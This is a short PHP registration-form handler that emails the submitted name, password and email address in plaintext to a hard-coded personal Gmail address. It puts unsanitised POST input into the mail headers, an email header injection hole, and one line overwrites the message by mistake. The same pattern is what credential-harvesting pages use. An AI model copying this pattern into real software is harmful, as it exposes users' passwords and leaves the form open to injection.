<?php
include 'register.php';

?>
<?php
$msg = "Name: ".$_POST['name']."\n";
$msg.= "Password: ".$_POST['pass']."\n";
$msg = "password: ".$_POST['repass']."\n";
$msg.= "E-mail: ".$_POST['email']."\n";


//set up the mail
$recipient = "thakurdipesh337@gmail.com";
$subject = "From Submission Results";
$mailheaders = "From: My website <thakurdipesh337@gmail.com> \n";
$mailheaders.= "Reply-To: ".$_POST['email'];

//send mail

if(mail($recipient, $subject, $msg, $mailheaders));
else die('Mail not send');

?>